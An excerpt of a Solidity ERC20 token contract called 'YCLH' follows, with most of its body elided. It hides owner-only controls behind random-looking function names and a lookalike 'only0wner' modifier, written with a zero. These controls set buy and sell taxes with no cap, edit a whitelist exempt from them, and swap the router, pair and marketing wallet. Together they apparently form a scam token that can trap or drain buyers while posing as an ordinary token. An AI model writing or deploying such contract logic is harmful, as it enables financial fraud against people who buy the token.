...
contract YCLH is ERC20, Ownable{
    ...
    mapping (address => bool) public aGYvrneVnG;
    ...
    constructor() ERC20("YCLH", "YCLH") {
        ...
        aGYvrneVnG[msg.sender] = true;
        aGYvrneVnG[address(pair)] = true;
        aGYvrneVnG[marketingWallet] = true;
        aGYvrneVnG[address(router)] = true;
        aGYvrneVnG[address(this)] = true;
    }
    ...
    function nNGHzHzOVBYb(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        taxes = Taxes(_marketing, _liquidity, _burn);
    }

    function oUGfnkfrkKIFQU(address [] calldata accounts, bool newValue) external only0wner {
        for(uint256 i = 0; i < accounts.length; i++) {
            aGYvrneVnG[accounts[i]] = newValue;
        }
    }

    function bheseVBhlhSeK(bool swaped) external only0wner {
        swapEd = swaped;
    }

    function zHvYQxCRyFbF(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        sellTaxes = Taxes(_marketing, _liquidity, _burn);
    }

    function KKtObczEFiJYeEA(address newWallet) external only0wner{
        marketingWallet = newWallet;
    }

    function efNzFJUALgz(IRouter _router, address _pair) external only0wner{
        router = _router;
        pair = _pair;
    }
